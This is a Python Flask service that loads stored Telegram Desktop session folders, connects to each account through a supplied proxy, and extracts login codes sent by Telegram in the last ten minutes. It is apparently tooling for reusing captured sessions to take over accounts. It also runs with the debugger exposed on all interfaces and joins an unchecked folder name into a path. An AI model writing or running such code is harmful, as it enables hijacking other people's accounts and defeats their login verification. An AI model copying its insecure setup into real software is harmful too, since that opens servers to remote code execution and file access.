import os
from opentele.api import UseCurrentSession
import opentele
from flask import Flask, request, jsonify
import re
from datetime import datetime, timedelta, timezone
from telethon import TelegramClient

LIMIT = 50
app = Flask(__name__)

@app.route('/api/messages', methods=['POST'])
async def get_messages():
    try:
        data = request.json
        proxy_host = data.get('proxy_host')
        proxy_port = data.get('proxy_port')
        proxy_username = data.get('proxy_username')
        proxy_password = data.get('proxy_password')
        tdata_folder = data.get('tdata_folder')
        
        if not proxy_host or not proxy_port or not tdata_folder:
            return jsonify({"error": "Missing parameters"}), 400
        
        tdatas_path = os.path.join(os.getcwd(), "Telegram account", tdata_folder)
        if not os.path.exists(tdatas_path):
            return jsonify({"error": "Folder does not exist"}), 400
        
        tdatas = [tdatas_path]
        messages_output = []
        login_code = None 
        
        for tdata in tdatas:
            try:
                session_path = os.path.join(tdata, f"{os.path.basename(tdata)}.session")
                
                # Configure proxy settings
                if proxy_username and proxy_password:
                    proxy = {
                        'proxy_type': 'http',
                        'addr': proxy_host,
                        'port': int(proxy_port),
                        'username': proxy_username,
                        'password': proxy_password
                    }
                else:
                    proxy = {
                        'proxy_type': 'http',
                        'addr': proxy_host,
                        'port': int(proxy_port)
                    }
                
                client = await opentele.td.TDesktop(tdata + "\\tdata").ToTelethon(
                    session=session_path,
                    flag=UseCurrentSession,
                    proxy=proxy
                )
                
                await client.connect()
                dialogs = [dialog async for dialog in client.iter_dialogs() if not dialog.is_group and not dialog.is_channel]
                messages_output = await process_dialog(dialogs, client)
                login_code = extract_login_code(messages_output)
                await client.disconnect()
            except Exception as exc:
                return jsonify({"error": str(exc)}), 400

        return jsonify({"status": "true", "messages": login_code[0], "code": login_code[1]}), 200
    except Exception as exc:
        return jsonify({"error": str(exc)}), 400
    
def extract_login_code(messages):
    code = ""
    sms = ""
    current_time = datetime.now(timezone(timedelta(hours=7)))
    current_time_utc = current_time.astimezone(timezone.utc)

    for line in reversed(messages):
        message_time_str = line.split(']')[0][1:]
        message_time = datetime.fromisoformat(message_time_str)
        
        if abs((current_time_utc - message_time).total_seconds()) <= 600:
            if "Login code: " in line or "Kod logowania: " in line:
                match = re.search(r'Login code: (.*?)\.|Kod logowania: (.*?)\.', line)
                code = match.group(1) if match.group(1) else match.group(2) if match.group(2) else None 
                sms = line

    return sms, code

async def process_dialog(dialogs, client):
    for dialog in dialogs:
        if dialog.title == "Telegram":
            messages_output = []
            async for message in client.iter_messages(dialog, limit=LIMIT):
                messages_output.append(f"[{message.date}] {message.sender.first_name} ({message.sender.username}): {message.message}")
            return messages_output
    return []

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=6688)
